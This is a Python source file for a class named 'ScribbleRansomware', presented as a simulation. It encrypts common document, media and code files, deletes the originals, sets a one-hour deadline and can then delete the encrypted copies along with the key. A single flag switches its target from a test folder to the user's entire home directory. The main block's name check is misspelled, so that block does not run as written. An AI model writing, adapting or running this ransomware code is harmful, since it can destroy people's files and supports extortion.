import os
import glob
import time
import json
import threading
import datetime
import tkinter as tk
from tkinter import ttk, messagebox
from cryptography.fernet import Fernet
from pathlib import Path

class ScribbleRansomware:
    def __init__(self, test_mode=True, target_directory=None):
        """
        Initialize the Scribble ransomware simulation.
        
        Args:
            test_mode (bool): If True, operate only in the specified target directory
            target_directory (str): Directory to target (only used in test_mode)
        """
        self.test_mode = test_mode
        self.target_directory = target_directory if target_directory else os.path.join(os.getcwd(), "test_files")
        self.key = None
        self.encrypted_files = []
        self.countdown_time = 3600  # 1 hour in seconds
        self.deadline = None
        self.encryption_complete = False
        self.extension = ".scribble"
        
        # Create a metadata file to track encrypted files
        self.metadata_file = os.path.join(os.getcwd(), ".scribble_metadata.json")
        
        # File types to target (common document and media types)
        self.target_extensions = [
            ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
            ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4", ".zip", ".rar",
            ".csv", ".json", ".xml", ".html", ".py", ".js", ".java", ".c", ".cpp"
        ]
    
    def generate_key(self):
        """Generate encryption key"""
        self.key = Fernet.generate_key()
        return self.key
    
    def save_metadata(self):
        """Save metadata about encrypted files"""
        metadata = {
            "key": self.key.decode(),
            "files": self.encrypted_files,
            "deadline": self.deadline.isoformat() if self.deadline else None,
            "encryption_complete": self.encryption_complete
        }
        
        with open(self.metadata_file, "w") as f:
            json.dump(metadata, f)
    
    def load_metadata(self):
        """Load metadata if it exists"""
        if os.path.exists(self.metadata_file):
            try:
                with open(self.metadata_file, "r") as f:
                    metadata = json.load(f)
                
                self.key = metadata["key"].encode()
                self.encrypted_files = metadata["files"]
                self.deadline = datetime.datetime.fromisoformat(metadata["deadline"]) if metadata["deadline"] else None
                self.encryption_complete = metadata["encryption_complete"]
                return True
            except Exception as e:
                print(f"Error loading metadata: {e}")
                return False
        return False
    
    def find_target_files(self):
        """Find all target files in the specified directory"""
        target_files = []
        
        if self.test_mode:
            # Create test directory if it doesn't exist
            if not os.path.exists(self.target_directory):
                os.makedirs(self.target_directory)
            
            # When in test mode, only scan the test directory
            search_path = os.path.join(self.target_directory, "**")
        else:
            # WARNING: This would scan the entire system in a real scenario
            # For educational purposes only
            search_path = os.path.join(os.path.expanduser("~"), "**")
        
        # Find all files with target extensions
        for ext in self.target_extensions:
            files = glob.glob(search_path + ext, recursive=True)
            target_files.extend(files)
        
        return target_files
    
    def encrypt_file(self, file_path):
        """Encrypt a single file"""
        try:
            # Create Fernet cipher with the key
            cipher = Fernet(self.key)
            
            # Read the file
            with open(file_path, "rb") as f:
                file_data = f.read()
            
            # Encrypt the data
            encrypted_data = cipher.encrypt(file_data)
            
            # Write the encrypted data to the file with new extension
            encrypted_path = file_path + self.extension
            with open(encrypted_path, "wb") as f:
                f.write(encrypted_data)
            
            # Delete the original file
            os.remove(file_path)
            
            # Add to encrypted files list
            self.encrypted_files.append({"original_path": file_path, "encrypted_path": encrypted_path})
            
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False
    
    def decrypt_file(self, file_info):
        """Decrypt a single file"""
        try:
            # Create Fernet cipher with the key
            cipher = Fernet(self.key)
            
            # Read the encrypted file
            with open(file_info["encrypted_path"], "rb") as f:
                encrypted_data = f.read()
            
            # Decrypt the data
            decrypted_data = cipher.decrypt(encrypted_data)
            
            # Write the decrypted data back to the original file
            with open(file_info["original_path"], "wb") as f:
                f.write(decrypted_data)
            
            # Delete the encrypted file
            os.remove(file_info["encrypted_path"])
            
            return True
        except Exception as e:
            print(f"Error decrypting {file_info['encrypted_path']}: {e}")
            return False
    
    def start_encryption(self):
        """Start the encryption process"""
        # Generate new key
        self.generate_key()
        
        # Find target files
        target_files = self.find_target_files()
        print(f"Found {len(target_files)} files to encrypt")
        
        # Encrypt each file
        for file_path in target_files:
            success = self.encrypt_file(file_path)
            if success:
                print(f"Encrypted: {file_path}")
        
        # Set encryption complete flag
        self.encryption_complete = True
        
        # Set deadline for decryption
        self.deadline = datetime.datetime.now() + datetime.timedelta(seconds=self.countdown_time)
        
        # Save metadata
        self.save_metadata()
        
        return len(self.encrypted_files)
    
    def start_decryption(self):
        """Start the decryption process"""
        if not self.key:
            print("No encryption key available")
            return 0
        
        # Decrypt each file
        decrypted_count = 0
        for file_info in self.encrypted_files[:]:
            success = self.decrypt_file(file_info)
            if success:
                self.encrypted_files.remove(file_info)
                decrypted_count += 1
                print(f"Decrypted: {file_info['original_path']}")
        
        # Update metadata
        self.save_metadata()
        
        # If all files are decrypted, clean up
        if len(self.encrypted_files) == 0:
            self.encryption_complete = False
            self.deadline = None
            # Remove metadata file
            if os.path.exists(self.metadata_file):
                os.remove(self.metadata_file)
        
        return decrypted_count
    
    def delete_files(self):
        """Simulate deleting files after deadline"""
        for file_info in self.encrypted_files[:]:
            try:
                os.remove(file_info["encrypted_path"])
                print(f"Deleted: {file_info['encrypted_path']}")
                self.encrypted_files.remove(file_info)
            except Exception as e:
                print(f"Error deleting {file_info['encrypted_path']}: {e}")
        
        # Update metadata
        self.key = None  # Delete the key
        self.save_metadata()
    
    def time_remaining(self):
        """Calculate time remaining before deadline"""
        if not self.deadline:
            return 0
        
        now = datetime.datetime.now()
        remaining = (self.deadline - now).total_seconds()
        return max(0, remaining)
    
    def is_deadline_passed(self):
        """Check if deadline has passed"""
        return self.time_remaining() <= 0

# Function to create test files (for demo purposes)
def create_test_files(directory, num_files=10):
    """Create test files in the specified directory"""
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    for i in range(num_files):
        file_type = i % 4
        
        if file_type == 0:
            # Text file
            file_path = os.path.join(directory, f"document_{i}.txt")
            with open(file_path, "w") as f:
                f.write(f"This is test document {i} with some important content.\n")
                f.write("Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n")
                f.write("Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.")
        
        elif file_type == 1:
            # JSON file
            file_path = os.path.join(directory, f"data_{i}.json")
            data = {
                "id": i,
                "name": f"Test Data {i}",
                "value": i * 10,
                "active": True,
                "tags": ["test", "data", f"item-{i}"]
            }
            with open(file_path, "w") as f:
                json.dump(data, f, indent=2)
        
        elif file_type == 2:
            # Python file
            file_path = os.path.join(directory, f"script_{i}.py")
            with open(file_path, "w") as f:
                f.write(f"# Test Python script {i}\n\n")
                f.write("def hello_world():\n")
                f.write('    print("Hello, World!")\n\n')
                f.write('if _name_ == "_main_":\n')
                f.write('    hello_world()\n')
        
        else:
            # HTML file
            file_path = os.path.join(directory, f"webpage_{i}.html")
            with open(file_path, "w") as f:
                f.write(f"<!DOCTYPE html>\n<html>\n<head>\n  <title>Test Page {i}</title>\n</head>\n")
                f.write("<body>\n  <h1>Test HTML Page</h1>\n  <p>This is test content.</p>\n</body>\n</html>")
    
    return num_files

# For testing
if _name_ == "_main_":
    # Create test directory and files
    test_dir = os.path.join(os.getcwd(), "test_files")
    num_created = create_test_files(test_dir, 5)
    print(f"Created {num_created} test files in {test_dir}")
    
    # Initialize ransomware in test mode
    ransomware = ScribbleRansomware(test_mode=True, target_directory=test_dir)
    
    # Encrypt files
    num_encrypted = ransomware.start_encryption()
    print(f"Encrypted {num_encrypted} files")
    
    # Display time remaining
    print(f"Time remaining: {ransomware.time_remaining()} seconds")
    
    # Simulate payment and decrypt files
    num_decrypted = ransomware.start_decryption()
    print(f"Decrypted {num_decrypted} files")